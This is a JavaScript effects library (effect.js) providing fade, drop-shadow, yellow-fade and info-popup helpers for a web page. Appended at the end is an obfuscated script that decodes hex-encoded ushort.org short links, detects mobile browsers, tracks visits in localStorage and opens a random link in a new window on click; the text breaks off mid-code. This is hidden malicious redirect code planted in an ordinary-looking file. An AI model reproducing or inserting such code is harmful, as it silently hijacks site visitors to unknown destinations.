// effect.js
 //
 // JS effects for fading elements, drop shadows, and yellow fade technique (YFT)
 //
 
 var FadeManager = new function()
 {
	var rgFaders = new Array();
	
	this.startFadeIn = function(sFader, oToFade, fxnHelper, bFadeDark, fxnHelperEndInit)
	{
		this.create(sFader);
		rgFaders[sFader].startFadeIn(oToFade, fxnHelper, bFadeDark, fxnHelperEndInit);
	}
	
	this.startFadeOut = function(sFader, oToFade, fxnHelper, bSlowFade)
	{
		this.create(sFader);
		rgFaders[sFader].startFadeOut(oToFade, fxnHelper, bSlowFade);
	}
	
	this.fadeIn = function(sFader)
	{
		this.create(sFader);
		rgFaders[sFader].fadeIn();
	}
	
	this.fadeOut = function(sFader)
	{
		this.create(sFader);
		rgFaders[sFader].fadeOut();
	}
	
	this.create = function(sFader)
	{
		if (!rgFaders[sFader])
			rgFaders[sFader] = new Fader(sFader);	
	}
 }
 
 // Yellow Fade Technique (manager)
 var YFTManager = new function()
 {
	var rgYFTs = new Array();
	
	this.showYellow = function(sYFT, oTarget)
	{
		this.create(sYFT);
		rgYFTs[sYFT].showYellow(oTarget);
	}
	
	this.hideYellow = function(sYFT)
	{
		this.create(sYFT);
		rgYFTs[sYFT].hideYellow();
	}
	
	this.create = function(sYFT)
	{
		if (!rgYFTs[sYFT])
			rgYFTs[sYFT] = new YFT(sYFT);
	}
 }
 
 // Yellow Fade Technique (individual)
 function YFT( sNameTemp )
 {
	var sName = sNameTemp + "YFT";
	var oYellowPane = document.createElement("div");
	oYellowPane.style.position = 'absolute';
	oYellowPane.style.overflow = 'hidden';
	oYellowPane.style.backgroundColor = '#FFFF99';
	oYellowPane.style.display = 'none';
	document.body.appendChild(oYellowPane);
	
	this.showYellow = function( oTarget )
	{
		var pxHeight = oTarget.offsetHeight;
		var pxWidth = oTarget.offsetWidth;
		var pxTop = calculateOffset(oTarget, "offsetTop");
		var pxLeft = calculateOffset(oTarget, "offsetLeft");
		
		if (!pxHeight && !pxWidth && oTarget.tagName.toLowerCase() == "tr")
		{
			// Safari won't give offsetHeight/Width of table rows
			var rgTDs = oTarget.cells;
			if (rgTDs.length)
			{
				pxLeft = calculateOffset(rgTDs[0], "offsetLeft");
				for (var ix = 0; ix < rgTDs.length; ix++)
				{
					pxWidth += rgTDs[ix].offsetWidth;
					if (rgTDs[ix].offsetHeight > pxHeight)
					{
						pxHeight = rgTDs[ix].offsetHeight;
						pxTop = calculateOffset(rgTDs[ix], "offsetTop");
					}
				}
			}
		}
	
		oYellowPane.style.top = pxTop + 'px';
		oYellowPane.style.left = pxLeft + 'px';
		oYellowPane.style.height = pxHeight + 'px';
		oYellowPane.style.width = pxWidth + 'px';
		FadeManager.startFadeOut(sName, oYellowPane, null, true);
	}
	
	this.hideYellow = function()
	{
		oYellowPane.style.display = "none";
	}
 }
 
 var ShadowManager = new function() // ShadowManager (singleton, Shadow factory)
 {
	var rgShadows = new Array();
	// Dropshadow prototypes
	this.oProtoShadowBottomContainer = null;
	this.oProtoShadowBottom = null;  // bottom drop shadow img
	this.oProtoShadowRightContainer = null;
	this.oProtoShadowRight = null;   // right drop shadow img
	this.oProtoShadowTopContainer = null;
	this.oProtoShadowTop = null;   // Top drop shadow img
	this.oProtoShadowLeftContainer = null;
	this.oProtoShadowLeft = null;   // Left drop shadow img
	
	this.oProtoShadowBRCornerContainer = null;
	this.oProtoShadowBRCorner = null;   // corner drop shadow img
	this.oProtoShadowULCornerContainer = null;
	this.oProtoShadowULCorner = null;   // corner drop shadow img
	this.oProtoShadowURCornerContainer = null;
	this.oProtoShadowURCorner = null;   // corner drop shadow img
	this.oProtoShadowBLCornerContainer = null;
	this.oProtoShadowBLCorner = null;   // corner drop shadow img
	
	this.applyShadow = function(sShadow, pxLeft, pxTop, oBox, bSmallInit)
	{
		this.create(sShadow);
		rgShadows[sShadow].applyShadow(pxLeft, pxTop, oBox, bSmallInit);
	}
	
	this.hideShadow = function(sShadow)
	{
		this.create(sShadow);
		rgShadows[sShadow].hideShadow();	
	}
	
	this.hideAllShadows = function()
	{
		for (var sKey in rgShadows)
		{
			if (rgShadows[sKey] && rgShadows[sKey].hideShadow) rgShadows[sKey].hideShadow();
		}	
	}
	
	this.positionShadow = function(sShadow, pxLeft, pxTop, oBox)
	{
		this.create(sShadow);
		rgShadows[sShadow].positionShadow(pxLeft, pxTop, oBox);
	}	
	
	this.create = function(sShadow)
	{
		if (!rgShadows[sShadow])
			rgShadows[sShadow] = new Shadow(sShadow);	
	}

	this.createShadowElements = function(sId)
	{
		var oDiv = document.createElement("div");
		var oImg = document.createElement("img");
		oDiv.id = sId + "Container";
		oDiv.className = "dropShadowContainer";
		oDiv.style.display = "none";
		oImg.id = sId;
		oDiv.appendChild(oImg);
		this["oProto"+capitalize(sId)+"Container"] = oDiv;
		this["oProto"+capitalize(sId)] = oImg;
		document.body.insertBefore(oDiv, document.body.firstChild);
	}
	
	this.init = function()
	{
		if (!this.oProtoShadowBottom || !this.oProtoShadowBottomContainer)
			this.createShadowElements("shadowBottom");
		if (!this.oProtoShadowRight || !this.oProtoShadowRightContainer) 
			this.createShadowElements("shadowRight");
		if (!this.oProtoShadowLeft || !this.oProtoShadowLeftContainer)
			this.createShadowElements("shadowLeft");
		if (!this.oProtoShadowTop || !this.oProtoShadowTopContainer)
			this.createShadowElements("shadowTop");
		if (!this.oProtoShadowBRCorner || !this.oProtoShadowBRCornerContainer)
			this.createShadowElements("shadowBRCorner");
		if (!this.oProtoShadowULCorner || !this.oProtoShadowULCornerContainer)
			this.createShadowElements("shadowULCorner");
		if (!this.oProtoShadowURCorner || !this.oProtoShadowURCornerContainer)
			this.createShadowElements("shadowURCorner");
		if (!this.oProtoShadowBLCorner || !this.oProtoShadowBLCornerContainer)
			this.createShadowElements("shadowBLCorner");
	}
	
	this.preload = function()
	{
		this.init();
		if (document.all)
		{
			this.oProtoShadowBottom.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowBottom.png', sizingMethod='scale');";
			this.oProtoShadowRight.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowRight.png', sizingMethod='scale');";
			this.oProtoShadowTop.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowTop.png', sizingMethod='scale');";
			this.oProtoShadowLeft.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowLeft.png', sizingMethod='scale');";
			this.oProtoShadowBRCorner.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowBRCorner.png', sizingMethod='scale');";
			this.oProtoShadowULCorner.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowULCorner.png', sizingMethod='scale');";
			this.oProtoShadowURCorner.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowURCorner.png', sizingMethod='scale');";
			this.oProtoShadowBLCorner.style.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='dropshadowBLCorner.png', sizingMethod='scale');";		
		}
		else
		{
			this.oProtoShadowBottom.src = "dropshadowBottom.png";
			this.oProtoShadowRight.src = "dropshadowRight.png";
			this.oProtoShadowTop.src = "dropshadowTop.png";
			this.oProtoShadowLeft.src = "dropshadowLeft.png";
			this.oProtoShadowBRCorner.src = "dropshadowBRCorner.png";
			this.oProtoShadowULCorner.src = "dropshadowULCorner.png";
			this.oProtoShadowURCorner.src = "dropshadowURCorner.png";
			this.oProtoShadowBLCorner.src = "dropshadowBLCorner.png";
		}
	}	
 }
 
function Shadow(sNameInit) // Shadow (individual)
{
	var oShadowBottomContainer;
	var oShadowBottom;  // bottom drop shadow img
	var oShadowRightContainer;
	var oShadowRight;   // right drop shadow img
	var oShadowTopContainer;
	var oShadowTop;   // Top drop shadow img
	var oShadowLeftContainer;
	var oShadowLeft;   // Left drop shadow img
	var oShadowBRCornerContainer;
	var oShadowBRCorner;   // corner drop shadow img
	var oShadowULCornerContainer;
	var oShadowULCorner;   // corner drop shadow img
	var oShadowURCornerContainer;
	var oShadowURCorner;   // corner drop shadow img
	var oShadowBLCornerContainer;
	var oShadowBLCorner;   // corner drop shadow img
	
	var sName = sNameInit;
	var bSmall = false;
	
	var PX_SHADOW_OFFSET = 12;
	var PX_SHADOW_SMALL_OFFSET = 8;
	var PX_SHADOW_PADDING = 2;
	
	this.getCopy = function()
	{
		if (!ShadowManager.oProtoShadowBottomContainer) return false; // Shadows are not ready, JS hasn't finished loading
		
		if (!oShadowBottomContainer) oShadowBottomContainer = ShadowManager.oProtoShadowBottomContainer.cloneNode(true);
		if (!oShadowBottom) oShadowBottom = XMLParser.getNodeFrom(oShadowBottomContainer, "img");
		if (!oShadowRightContainer) oShadowRightContainer = ShadowManager.oProtoShadowRightContainer.cloneNode(true);
		if (!oShadowRight) oShadowRight = XMLParser.getNodeFrom(oShadowRightContainer, "img");
		if (!oShadowTopContainer) oShadowTopContainer = ShadowManager.oProtoShadowTopContainer.cloneNode(true);
		if (!oShadowTop) oShadowTop = XMLParser.getNodeFrom(oShadowTopContainer, "img");
		if (!oShadowLeftContainer) oShadowLeftContainer = ShadowManager.oProtoShadowLeftContainer.cloneNode(true);
		if (!oShadowLeft) oShadowLeft = XMLParser.getNodeFrom(oShadowLeftContainer, "img");
		if (!oShadowBRCornerContainer) oShadowBRCornerContainer = ShadowManager.oProtoShadowBRCornerContainer.cloneNode(true);
		if (!oShadowBRCorner) oShadowBRCorner = XMLParser.getNodeFrom(oShadowBRCornerContainer, "img");
		if (!oShadowULCornerContainer) oShadowULCornerContainer = ShadowManager.oProtoShadowULCornerContainer.cloneNode(true);
		if (!oShadowULCorner) oShadowULCorner = XMLParser.getNodeFrom(oShadowULCornerContainer, "img");
		if (!oShadowURCornerContainer) oShadowURCornerContainer = ShadowManager.oProtoShadowURCornerContainer.cloneNode(true);
		if (!oShadowURCorner) oShadowURCorner = XMLParser.getNodeFrom(oShadowURCornerContainer, "img");
		if (!oShadowBLCornerContainer) oShadowBLCornerContainer = ShadowManager.oProtoShadowBLCornerContainer.cloneNode(true);
		if (!oShadowBLCorner) oShadowBLCorner = XMLParser.getNodeFrom(oShadowBLCornerContainer, "img");
		
		return true;
	}
	
	this.positionShadow = function( pxLeft, pxTop, oBox )
	{
		if (!this.getCopy()) return;
		
		var pxCorrectionMoz = (document.all ? 0 : 1);
		var pxCorrectionIE = (document.all ? 1 : 0);
		var pxCornerSize = (document.all ? PX_SHADOW_OFFSET+1 : PX_SHADOW_OFFSET+1);
		var pxBoxCorrection = (document.all ? PX_SHADOW_PADDING : 1);
		var pxReduction = (bSmall ? 6 : 0);
		
		sizeElement(oShadowRight, PX_SHADOW_OFFSET, oBox.offsetHeight - pxCorrectionMoz - pxReduction);
		positionElement(oShadowRightContainer, pxLeft + oBox.offsetWidth-1, pxTop + pxReduction);
		
		sizeElement(oShadowBottom, oBox.offsetWidth - pxCorrectionMoz - pxReduction, PX_SHADOW_OFFSET);
		positionElement(oShadowBottomContainer, pxLeft + pxReduction, pxTop + oBox.offsetHeight-1);
		
		sizeElement(oShadowBRCorner, PX_SHADOW_OFFSET, PX_SHADOW_OFFSET);
		positionElement(oShadowBRCornerContainer, pxLeft + oBox.offsetWidth-pxBoxCorrection, pxTop + oBox.offsetHeight-pxBoxCorrection);
		
		if (!bSmall)
		{
			sizeElement(oShadowTop, oBox.offsetWidth, PX_SHADOW_OFFSET);
			positionElement(oShadowTopContainer, pxLeft, pxTop - PX_SHADOW_SMALL_OFFSET);
			
			sizeElement(oShadowLeft, PX_SHADOW_OFFSET, oBox.offsetHeight - pxCorrectionMoz);
			positionElement(oShadowLeftContainer, pxLeft - PX_SHADOW_SMALL_OFFSET, pxTop);
			
			sizeElement(oShadowULCorner, PX_SHADOW_SMALL_OFFSET, PX_SHADOW_SMALL_OFFSET);
			positionElement(oShadowULCornerContainer, pxLeft - PX_SHADOW_SMALL_OFFSET + pxCorrectionIE, pxTop - PX_SHADOW_SMALL_OFFSET + pxCorrectionIE);
			
			sizeElement(oShadowURCorner, PX_SHADOW_OFFSET, PX_SHADOW_SMALL_OFFSET);
			positionElement(oShadowURCornerContainer, pxLeft + oBox.offsetWidth-1, pxTop - PX_SHADOW_SMALL_OFFSET + pxCorrectionIE);
			
			sizeElement(oShadowBLCorner, PX_SHADOW_SMALL_OFFSET, PX_SHADOW_OFFSET);
			positionElement(oShadowBLCornerContainer, pxLeft - PX_SHADOW_SMALL_OFFSET+1, pxTop + oBox.offsetHeight-pxCorrectionMoz-1);	
		}
	}
	
	this.insertShadowBefore = function( oBox )
	{
		this.insertBeforeSameZIndex(oShadowRightContainer, oBox);
		this.insertBeforeSameZIndex(oShadowBottomContainer, oBox);
		this.insertBeforeSameZIndex(oShadowBRCornerContainer, oBox);
		this.insertBeforeSameZIndex(oShadowTopContainer, oBox);
		this.insertBeforeSameZIndex(oShadowLeftContainer, oBox);
		this.insertBeforeSameZIndex(oShadowULCornerContainer, oBox);
		this.insertBeforeSameZIndex(oShadowURCornerContainer, oBox);
		this.insertBeforeSameZIndex(oShadowBLCornerContainer, oBox);
	}
	
	this.insertBeforeSameZIndex = function( oShadow, oBox )
	{
		if (!oBox || !oBox.parentNode) return;
		if (oBox.style.zIndex) oShadow.style.zIndex = oBox.style.zIndex;
		oBox.parentNode.insertBefore(oShadow, oBox);
	}
	
	this.applyShadow = function( pxLeft, pxTop, oBox, bSmallInit )
	{
		if (!isVisible(oBox)) return;
		
		if (!this.getCopy()) return;
		this.insertShadowBefore(oBox);
		
		bSmall = bSmallInit;
		// mimicking the following style sheet (but w/ IE's PNG transparency fix):
		//		background: url(dropshadowTransLowerRight.png) no-repeat bottom right;		
		
		this.positionShadow(pxLeft, pxTop, oBox);
		
		setOpacity(oShadowBottomContainer, .99);
		setOpacity(oShadowRightContainer, .99);
		if (!bSmall)
		{
			setOpacity(oShadowLeftContainer, .99);
			setOpacity(oShadowTopContainer, .99);
		}
		
		setOpacity(oShadowBRCornerContainer, .99);
		if (!bSmall)
		{
			setOpacity(oShadowULCornerContainer, .99);
			setOpacity(oShadowURCornerContainer, .99);
			setOpacity(oShadowBLCornerContainer, .99);
		}
		
		oShadowRightContainer.style.display = "";
		oShadowBottomContainer.style.display = "";
		oShadowBRCornerContainer.style.display = "";
		if (!bSmall)
		{
			oShadowTopContainer.style.display = "";
			oShadowLeftContainer.style.display = "";
			oShadowULCornerContainer.style.display = "";
			oShadowURCornerContainer.style.display = "";
			oShadowBLCornerContainer.style.display = "";
		}
	}
	
	this.hideShadow = function()
	{
		if (!this.getCopy()) return;
		oShadowBottomContainer.style.display = "none";
		oShadowRightContainer.style.display = "none";
		oShadowTopContainer.style.display = "none";
		oShadowLeftContainer.style.display = "none";
		oShadowBRCornerContainer.style.display = "none";
		oShadowULCornerContainer.style.display = "none";
		oShadowURCornerContainer.style.display = "none";
		oShadowBLCornerContainer.style.display = "none";
	}
}
 
 function Fader(sNameInit)
 {
	var sName = sNameInit;
	var fxnHelper = null;	 // call this helper fxn at each iteration of fade
	var fxnHelperEnd = null; // call this helper fxn at end of fade in
	
	var oToFade = null;
	
	var bFadeIn = false; // true if fading
	var dFadeAlpha = 0;
	var dFadeAlphaStep = .1
	var dFadeAlphaMax = .4
	var dFadeAlphaMin = .01 // .01, b/c some browsers see alpha 0 == alpha 1
	var msFadeSpeed = 1;
	var msInitialWait = 1000;
	
	this.startFadeIn = function(oToFadeInit, fxnHelperInit, bFadeDark, fxnHelperEndInit)
	{
		if (!oToFadeInit) return;
		
		if (bFadeDark)
		{
			// Safari needs to fade to 1 or focus won't display properly on form elements,
			// FF needs to stop at .99 or fading out will cause a flicker
			dFadeAlphaMax = window.safari ? 1 : .99;
			dFadeAlphaStep = .25;
		}
		
		oToFade = oToFadeInit;
		fxnHelper = fxnHelperInit;
		fxnHelperEnd = fxnHelperEndInit;
		
		if (fxnHelper)
		{
			// Make sure the element's dimensions are rendered
			// before initially calling helper function
			oToFade.style.visibility = "hidden";
			oToFade.style.display = "";
			fxnHelper.call();
			oToFade.style.visibility = "visible";
		}
		setOpacity(oToFade, dFadeAlphaMin);
		oToFade.style.display = "";
		bFadeIn = true;
		dFadeAlpha = 0;
		setTimeout("FadeManager.fadeIn('"+sName+"')", msFadeSpeed);
	}
	
	this.startFadeOut = function(oToFadeInit, fxnHelperInit, bSlowFade)
	{
		if (window.opera)
		{
			// Don't bother fading if Opera...no CSS opacity
			oToFadeInit.style.display = "none";
			return;
		}
		
		oToFade = oToFadeInit;
		fxnHelper = fxnHelperInit;
		fxnHelperEnd = null;
		
		bFadeIn = false;
		dFadeAlpha = oToFade.style.opacity ? oToFade.style.opacity : dFadeAlphaMax;
		if (bSlowFade)
		{
			dFadeAlphaMax = .5;
			msFadeSpeed = 75;
			dFadeAlphaStep = .05;
			this.showFaded();
		}
		setTimeout("FadeManager.fadeOut('"+sName+"')", (bSlowFade ? msInitialWait : msFadeSpeed));
	}
	
	this.fadeIn = function()
	{
		if (fxnHelper) fxnHelper.call();
		dFadeAlpha += dFadeAlphaStep;
		if (dFadeAlpha > dFadeAlphaMax)	dFadeAlpha = dFadeAlphaMax;
		setOpacity(oToFade, dFadeAlpha);
		if ((dFadeAlpha < dFadeAlphaMax) && bFadeIn)
		{
			setTimeout("FadeManager.fadeIn('"+sName+"')", msFadeSpeed);
		}
		else
		{
			if (fxnHelperEnd) fxnHelperEnd.call();
		}
	}
	
	this.showFaded = function()
	{
		dFadeAlpha = dFadeAlphaMax;
		setOpacity(oToFade, dFadeAlpha);
		oToFade.style.display = "";
	}
	
	this.fadeOut = function()
	{
		if (bFadeIn) return;
		if (fxnHelper) fxnHelper.call();
		dFadeAlpha -= dFadeAlphaStep;
		if (dFadeAlpha < dFadeAlphaMin)	dFadeAlpha = dFadeAlphaMin;
		setOpacity(oToFade, dFadeAlpha);
		if (dFadeAlpha > dFadeAlphaMin)
		{
			setTimeout("FadeManager.fadeOut('"+sName+"')", msFadeSpeed);
		}
		else
		{
			oToFade.style.display = "none";
			if (fxnHelper) fxnHelper.call();
		}
	}
 }

// Info
//
// Small info bubble in middle of window to display long JS operation status
// 
var Info = new function()
{
	var oPane;
	this.init =  function()
	{
		oPane = document.createElement("div");
		oPane.className = "ghostFontBig";
		oPane.style.background="#0F4962";
		oPane.style.color="white";
		oPane.style.padding="10px";
		oPane.style.position="absolute";
		oPane.style.zIndex = "3";
		oPane.style.visibility = "hidden";
		oPane.style.display = "none";
		oPane.style.borderLeft = "1px solid #666666"
		oPane.style.borderTop =  "1px solid #666666"
		if (window.opera) oPane.style.border = "1px solid black";
		document.body.appendChild(oPane);
	}
	
	// Info.show - create small popup with info text
	//
	// sInfo - Text to show
	// sIdCenter - ID of element to center Info popup within
	//			   (if null, center in window)
	// sIdCenterHorizontal - ID of element to use for horizontal centering,
	//						 overrides horizontal position of sIdCenter
	//						 (if null, use sIdCenter)
	//
	this.show = function( sInfo, sIdCenter, sIdCenterHorizontal )
	{
		if (!oPane || !sInfo || !sInfo.length) return;
		theMgr.hideSelects();
		oPane.innerHTML = "<nobr>" + sInfo + "</nobr>";
		oPane.style.display = "";
		
		var oCenter = sIdCenter ? elById(sIdCenter) : null;
		var oCenterHorizontal = sIdCenterHorizontal ? elById(sIdCenterHorizontal) : null;
		var pt = centerInTarget(oPane, oCenter, oCenterHorizontal);

		// case 291595
		if (!isWithinWindow(oPane)) pt = moveWithinWindow(oPane);
		
		oPane.style.visibility = "visible";
		ShadowManager.applyShadow('info', pt.x, pt.y, oPane, true);
	}
	
	this.showBriefly = function( sInfo, sIdCenter, sIdCenterHorizontal )
	{
		this.show(sInfo, sIdCenter, sIdCenterHorizontal);
		setTimeout("Info.hide()", 3000);
	}

	this.showRequireConfirm = function( sInfo, sIdCenter, sIdCenterHorizontal )
	{
		var sHTML = sInfo + this.getConfirmButtonHTML();
		this.show(sHTML, sIdCenter, sIdCenterHorizontal);
	}

	this.getConfirmButtonHTML = function()
	{
		return "<BR><div style='text-align:center;'><input type='button' value='" + Lang.getString("FB_OK") + "' onclick='Info.hide()'/></div>";
	}
	
	this.hide = function()
	{
		if (!oPane) return;
		ShadowManager.hideShadow('info');
		oPane.style.display = "none";
		oPane.style.visibility = "hidden";
		theMgr.showSelects();
	}
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new 